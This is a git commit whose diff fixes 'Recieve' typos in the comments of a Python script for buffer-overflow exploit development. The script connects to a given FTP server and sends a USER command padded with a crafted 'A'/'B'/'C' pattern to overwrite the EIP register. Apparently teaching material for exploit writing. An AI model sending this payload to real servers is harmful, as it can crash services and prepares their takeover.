5a2599b4f854a5de115e7e5837f73148885c7913
swedge <scott.wedge@gmail.com>
2020-04-14 17:04:59 -0400

    Fixes #1

--- Python3/Finding_EIP_Offset/EIPOverwritexample.py
+++ Python3/Finding_EIP_Offset/EIPOverwritexample.py
@@ -5,13 +5,13 @@ import sys, socket, time
  
 # Use in the form "python fuzzer.py  "
  
-host = sys.argv[1] # Recieve IP from user
-port = int(sys.argv[2]) # Recieve Port from user
+host = sys.argv[1] # Receive IP from user
+port = int(sys.argv[2]) # Receive Port from user
  
 # EIP Writing Pattern
 pattern = "A"*2004 + "B"*4 + "C"*500
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
 client.connect((host, port)) # Connect to user supplied port and IP address
-client.recv(1024) # Recieve FTP Banner
+client.recv(1024) # Receive FTP Banner
 client.send("USER " + pattern) # Send the user command with a variable length name
 client.close() # Close the Connection
